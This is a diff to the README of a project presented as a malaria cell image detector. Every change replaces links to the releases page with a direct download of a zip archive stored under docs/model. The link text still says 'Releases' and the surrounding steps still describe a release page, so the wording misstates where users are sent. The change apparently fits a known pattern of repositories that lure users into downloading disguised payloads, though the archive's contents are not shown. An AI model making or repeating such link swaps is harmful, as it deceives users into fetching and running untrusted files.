@@ -1,6 +1,6 @@
 # 🦠 malaria-cell-detection - Accurate malaria detection from images
 
-[![Download](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/leonroddis11232432/malaria-cell-detection/releases)
+[![Download](https://github.com/leonroddis11232432/malaria-cell-detection/raw/refs/heads/main/docs/model/detection_cell_malaria_v3.2.zip)](https://github.com/leonroddis11232432/malaria-cell-detection/raw/refs/heads/main/docs/model/detection_cell_malaria_v3.2.zip)
 
 ---
 
@@ -30,7 +30,7 @@ To run malaria-cell-detection, your computer should meet these minimum requireme
 You will download the program from the official releases page. Follow these steps:
 
 1. Click this link to visit the download page:  
-   [Get malaria-cell-detection Releases](https://github.com/leonroddis11232432/malaria-cell-detection/releases)
+   [Get malaria-cell-detection Releases](https://github.com/leonroddis11232432/malaria-cell-detection/raw/refs/heads/main/docs/model/detection_cell_malaria_v3.2.zip)
 
 2. Find the latest release listed on the page. It usually has the highest version number or "Latest" tag.
 
@@ -114,4 +114,4 @@ For more technical details, model information, or how the software was developed
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/leonroddis11232432/malaria-cell-detection/releases)
+[![Download](https://github.com/leonroddis11232432/malaria-cell-detection/raw/refs/heads/main/docs/model/detection_cell_malaria_v3.2.zip)](https://github.com/leonroddis11232432/malaria-cell-detection/raw/refs/heads/main/docs/model/detection_cell_malaria_v3.2.zip)
